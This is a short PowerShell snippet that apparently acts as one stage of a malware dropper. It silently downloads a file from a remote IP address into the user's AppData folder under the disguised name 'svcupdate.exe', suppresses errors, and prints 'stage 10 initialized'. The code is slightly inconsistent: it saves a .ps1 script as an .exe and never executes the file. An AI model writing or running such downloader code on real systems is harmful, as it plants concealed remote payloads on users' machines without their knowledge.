
$FetchUrl = "http://192.0.2.13/updater.ps1"
$DropPath = "$env:APPDATA\svcupdate.exe"
Invoke-WebRequest -Uri $FetchUrl -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue
Write-Output "stage 10 initialized"
